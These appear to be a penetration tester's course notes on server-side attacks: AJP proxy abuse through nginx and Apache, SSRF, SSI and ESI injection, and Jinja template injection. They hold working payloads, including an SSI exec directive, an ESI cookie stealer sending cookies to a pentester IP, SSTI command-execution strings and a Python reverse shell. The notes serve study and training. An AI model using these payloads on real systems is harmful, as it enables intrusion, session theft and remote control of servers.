
- Server-Side attack -> Target server

#### Types of Server-Side Attacks

- Abusing Intermediary Applications 
- Server-Side Request Forgery (SSRF)
- Server-Side Includes Injection (SSI)
- Edge-Side Includes Injection (ESI)
- Server-Side Template Injection (SSTI)

## AJP Proxy


```
        User
          |
          v
   +-------------+
   |    Apache   |
   +-------------+
      /       \
     /         \
Static        Dynamic
Content       Content
   |             |
   v             |
Serve Directly   |
   |             |
   v             |
 (HTML,        Use AJP port 8009
  Images)        |
                 v
            +---------+
            |  Tomcat |
            +---------+
               |
               v
            Process
               |
               v
          Response via AJP port 8009
               |
               v
        +-------------+
        |    Apache   |
        +-------------+
              |
              v
            User

```

### Working
- **Static Content Handling**:
    
    - Apache serves static pages (e.g., images, HTML files) directly.
- **Dynamic Content Handling**:
    
    - Apache forwards dynamic page requests to Tomcat via AJP.
    - Tomcat processes the Java application request.
- **Response Delivery**:
    
    - Apache sends the final response back to the user.




### Pentest Idea

- if port 8009 (AJP) is open 
- Configure Your Own Web Server
- Forward Requests from apache to AJP port of target
- Access Hidden Resources of target websites


### Hands on Experience

- create `tomcat-users.xml`
```shell-session
<tomcat-users>
  <role rolename="manager-gui"/>
  <role rolename="manager-script"/>
  <user username="tomcat" password="s3cret" roles="manager-gui,manager-script"/>
</tomcat-users>
```
- run tomcat using command below
```bash
sudo docker run -it --rm -p 8009:8009 -v $(pwd)/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml --name tomcat tomcat:8.0

```

![[Pasted image 20240708121004.png]]


#### Setting up NGNIX reverse Proxy


- Download the Nginx source code
- Download the required module
- Compile Nginx source code with the `ajp_module`.
- Create a configuration file pointing to the AJP Port


- Download Nginx Source Code
```shell
wget https://nginx.org/download/nginx-1.21.3.tar.gz
```

``` shell
tar -xzvf nginx-1.21.3.tar.gz
```
- Compile Nginx source code with the ajp module
```
git clone https://github.com/dvershinin/nginx_ajp_module.git
```

```
cd nginx-1.21.3
```

```
sudo apt install libpcre3-dev
```

```
./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
```

```
make
```

```
sudo make install
```

```
nginx -V
```

- Pointing to the AJP Port
	- Comment out the entire `server` block
	- append the following lines inside the `http` block in `/etc/nginx/conf/nginx.conf`

```shell-session
upstream tomcats {
	server <TARGET_SERVER>:8009;
	keepalive 10;
	}
server {
	listen 80;
	location / {
		ajp_keep_conn on;
		ajp_pass tomcats;
	}
}
```

- now use curl to view the hidden page
```
curl http://localhost:8080
```

==now you have access to hidden page of target server tomcat page ==

#### Apache Reverse Proxy & AJP


- Install the libapache2-mod-jk package
- Enable the module
- Create the configuration file pointing to the target AJP-Proxy port


- to change port `/etc/apache2/ports.conf`

- configuration and pointing to AJP port
```shell-session
sudo apt install libapache2-mod-jk
```
```
sudo a2enmod proxy_ajp
```
```
sudo a2enmod proxy_http
```
```
export TARGET="<TARGET_IP>"
```
```
echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:8009/
ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
```
```
sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
```
```
sudo systemctl start apache2
```




## Server-Side Request Forgery (SSRF)

##### Impact

- Interacting with known internal systems
- Discovering internal services via port scans
- Disclosing local/sensitive data
- Including files in the target application
- Leaking NetNTLM hashes using UNC Paths (Windows)
- Achieving remote code execution




## Server-Side Includes (SSI) Injection
[DEEP_DIVE](https://cyberbull.medium.com/server-side-includes-ssi-injection-deep-dive-226a7e524a45)
[CHEETSHEET](https://cheat-sheets.org/sites/ssi.su/)

- what is server side includes ? -> includes contents of one file into another file
							-> before the server send response to client every files are included


```

    website/
    ├── index.html
    │
    │   ┌─────────────────────────────────────────────────────────────┐
    │   │ <!--#include virtual="/includes/header.html" -->            │
    │   │ <div class="content">                                        │
    │   │   <h2>Home Page</h2>                                         │
    │   │   <p>Welcome to the home page of my website.</p>             │
    │   │ </div>                                                       │
    │   │ <!--#include virtual="/includes/footer.html" -->             │
    │   └─────────────────────────────────────────────────────────────┘
    │
    ├── about.html
    │
    │   ┌─────────────────────────────────────────────────────────────┐
    │   │ <!--#include virtual="/includes/header.html" -->            │
    │   │ <div class="content">                                        │
    │   │   <h2>About Us</h2>                                          │
    │   │   <p>This is the about page of my website.</p>               │
    │   │ </div>                                                       │
    │   │ <!--#include virtual="/includes/footer.html" -->             │
    │   └─────────────────────────────────────────────────────────────┘
    │
    ├── contact.html
    │
    │   ┌─────────────────────────────────────────────────────────────┐
    │   │ <!--#include virtual="/includes/header.html" -->            │
    │   │ <div class="content">                                        │
    │   │   <h2>Contact Us</h2>                                        │
    │   │   <p>This is the contact page of my website.</p>             │
    │   │ </div>                                                       │
    │   │ <!--#include virtual="/includes/footer.html" -->             │
    │   └─────────────────────────────────────────────────────────────┘
    │
    └── includes/
        ├── header.html
        │
        │   ┌─────────────────────────────────────────────────────────────┐
        │   │ <div class="header">                                        │
        │   │   <h1>Welcome to My Website</h1>                            │
        │   │   <nav>                                                     │
        │   │     <ul>                                                    │
        │   │       <li><a href="index.html">Home</a></li>                │
        │   │       <li><a href="about.html">About</a></li>               │
        │   │       <li><a href="contact.html">Contact</a></li>           │
        │   │     </ul>                                                   │
        │   │   </nav>                                                    │
        │   │ </div>                                                      │
        │   └─────────────────────────────────────────────────────────────┘
        │
        └── footer.html
            │
            │   ┌─────────────────────────────────────────────────────────────┐
            │   │ <div class="footer">                                        │
            │   │   <p>&copy; 2024 My Website</p>                             │
            │   └─────────────────────────────────────────────────────────────┘


```

- before the server sends `index.html` to client => server adds `header.html` and `footer.html` (includes) in `index.html`


### Identifying

- server identifies SSI files by ==extentions== `.shtml, .shtm, or .stm`
	- normal `.html` also contain SSI based on server config
- ==_User Input in SSI Directives_== 
```
<!-- Vulnerable SSI Directive -->  
<!--#include virtual="/path/to/user/input" -->
```




### Payloads

```html
// Date
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->
```



# Edge-Side Includes (ESI)
[REFER](https://gosecure.ai/blog/2018/04/03/beyond-xss-edge-side-include-injection/)

- dynamically assemble web content at the edge of the network (CDN or Reverse proxy)

```
Client Browser
       |
       v
Edge Server (CDN/Reverse Proxy)
  |                |             |
  v                v             v
Fetch             Fetch        Fetch
 /header.html  /content.html  /footer.html
  |                |             |
  v                v             v
      Assemble the Complete Page (index.html)
               |
               v
      Send Assembled Page to Client


```

<html>
<head>
  <title>My News Website</title>
</head>
<body>
  <esi:include src="/header.html"/>
  <esi:include src="/content.html"/>
  <esi:include src="/footer.html"/>
</body>
</html>
<html>
<head>
  <title>My News Website</title>
</head>
<body>
  <esi:include src="/header.html"/>
  <esi:include src="/content.html"/>
  <esi:include src="/footer.html"/>
</body>
</html>
<html>
<head>
  <title>My News Website</title>
</head>
<body>
  <esi:include src="/header.html"/>
  <esi:include src="/content.html"/>
  <esi:include src="/footer.html"/>
</body>
</html>
```html
<html> 
	<head> 
		<title>My News Website</title> 
	</head> 
	<body> 
		<esi:include src="/header.html"/> 
		<esi:include src="/content.html"/> 
		<esi:include src="/footer.html"/> 
	</body> 
</html>
```


### Payloads


```html
// Basic detection
<esi: include src=http://<PENTESTER IP>>

// XSS Exploitation Example
<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>

// Cookie Stealer (bypass httpOnly flag)
<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```





|**Software**|**Includes**|**Vars**|**Cookies**|**Upstream Headers Required**|**Host Whitelist**|
|:-:|:-:|:-:|:-:|:-:|:-:|
|Squid3|Yes|Yes|Yes|Yes|No|
|Varnish Cache|Yes|No|No|Yes|Yes|
|Fastly|Yes|No|No|No|Yes|
|Akamai ESI Test Server (ETS)|Yes|Yes|Yes|No|No|
|NodeJS esi|Yes|Yes|Yes|No|No|
|NodeJS nodesi|Yes|No|No|No|Optional|


- Includes: Supports the `<esi:includes>` directive
- Vars: Supports the `<esi:vars>` directive. Useful for bypassing XSS Filters
- Cookie: Document cookies are accessible to the ESI engine
- Upstream Headers Required: Surrogate applications will not process ESI statements unless the upstream application provides the headers
- Host Allowlist: In this case, ESI includes are only possible from allowed server hosts, making SSRF, for example, only possible against those hosts





## Server-Side Template Injections
- must be vulnerable to XSS
- tools [Tplmap](https://github.com/epinna/tplmap) or J2EE Scan
 ![[Pasted image 20240708191427.png]]


#### Setting up Tplmap

[Debug](https://fahmifj.github.io/blog/tplmap-install/)
```
git clone https://github.com/epinna/tplmap.git
```
```
cd tplmap
```
```
pip install virtualenv
```
```
virtualenv -p python2 venv
```
```
source venv/bin/activate
```
```
pip install -r requirements.txt
```
```
./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d <vuln_parameter>=<value>
```



## Python Primer for SSTI


|**No.**|**Methods**|**Description**|
|---|---|---|
|1.|`__class__`|Returns the object (class) to which the type belongs|
|2.|`__mro__`|Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples.|
|3.|`__subclasses__`|Each new class retains references to subclasses, and this method returns a list of references that are still available in the class|
|4.|`__builtins__`|Returns the builtin methods included in a function|
|5.|`__globals__`|A reference to a dictionary that contains global variables for a function|
|6.|`__base__`|Returns the base class inherited by the object <-- (__ base__ and __ mro__ are used to find the base class)|
|7.|`__init__`|Class initialization method|

### Payload Development

```python
import flask

# Initialize the string
s = 'HTB'

# Get type of the string
print(type(s))  # <class 'str'>

# Get class of the string
print(s.__class__)  # <class 'str'>

# List all attributes and methods of the string
print(dir(s))

# Get class of the class of the string
print(s.__class__.__class__)  # <class 'type'>

# Get base class of the string's class
print(s.__class__.__base__)  # <class 'object'>

# Get subclasses of the base class
base_subclasses = s.__class__.__base__.__subclasses__()
print(base_subclasses)

# Get Method Resolution Order and subclasses
mro_subclasses = s.__class__.mro()[1].__subclasses__()
print(mro_subclasses)

# List all subclasses with their indices
for i in range(len(mro_subclasses)):
    print(i, mro_subclasses[i].__name__)

# Function to search for a specific subclass by name
def searchfunc(name):
    x = s.__class__.mro()[1].__subclasses__()
    for i in range(len(x)):
        fn = x[i].__name__
        if fn.find(name) > -1:
            print(i, fn)

# Search for a subclass containing the name 'warning'
searchfunc('warning')
# Output should show: 215 catch_warnings (the exact index might differ)

# Access the `warnings.catch_warnings` class
y = mro_subclasses[215]
print(y)  # <class 'warnings.catch_warnings'>

# Access the built-in functions via `warnings.catch_warnings`
builtins = y()._module.__builtins__
print(builtins)

# Print all built-in functions containing 'import'
for i in builtins:
    if i.find('import') > -1:
        print(i, builtins[i])
# Output should include: __import__ <built-in function __import__>

```

- Why are we searching for `warning` ???
- because it imports Python's [sys module](https://github.com/python/cpython/blob/3.9/Lib/warnings.py#L3) , and from `sys`, the `os` module can be reached
- os modules are all from `warnings.catch_`


- **Final Payload**:
```python
''.__class__.__mro__[1].__subclasses__()

[215]()._module.__builtins__['__import__']('os').system('echo RCE from a string object')
```


- ==index of `warning` can change , develop payload everytime==


#### some specific functions

- `request` and `lipsum`

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

```python
{{lipsum.__globals__.os.popen('id').read()}}
```

- ==Reverse shell== 

```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<PENTESTER_IP>",<PENTESTER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()}}
```


